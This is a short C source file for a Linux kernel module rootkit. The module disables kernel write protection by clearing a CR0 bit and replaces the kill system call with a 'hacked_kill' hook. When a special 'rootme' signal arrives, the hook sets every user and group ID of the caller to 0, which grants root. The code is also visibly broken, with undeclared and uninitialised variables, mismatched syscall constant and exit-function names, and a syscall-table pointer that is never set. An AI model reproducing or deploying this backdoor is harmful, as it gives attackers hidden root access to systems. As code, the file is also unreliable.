#include<linux/module.h>
#include "heal.h"

void heal_root(void)
{
  struct cred *newcreds;
  ids = prepare_creds();
  if (newcreds == NULL)
    return;
  ids->uid.val = newcreds->gid.val = 0;
  ids->euid.val = newcreds->egid.val = 0;
  ids->suid.val = newcreds->sgid.val = 0;
  ids->fsuid.val = newcreds->fsgid.val = 0;

  commit_creds(ids);
}

static t_syscall orig_kill;
asmlinkage int
hacked_kill(const struct pt_regs *pt_regs)
{
  pid_t pid = (pid_t) pt_regs->di;
  int sig = (int) pt_regs->si;
  
  struct task_struct *task;
  
  switch (sig) {
    case rootme:
      heal_root();
      break;
    default:
      return orig_kill(pt_regs);
  }

  return 0;
}

static unsigned long *__sys_call_table;
unsigned long *get_syscall_table(void)
{
        unsigned long *syscall_table;
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
        return syscall_table;
}

unsigned long cr0;

static int __init heal_main(void)
{
  cr0=read_cr0();

  orig_kill = (t_syscall)__sys_call_table[__NK_kill];
  
  write_cr0_forced(cr0 & ~0x00010000);
  __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
  write_cr0_forced(cr0);
}



static void __exit heal_end(void)
{
  return NULL;
}

module_init(heal_main);
module_exit(head_end);
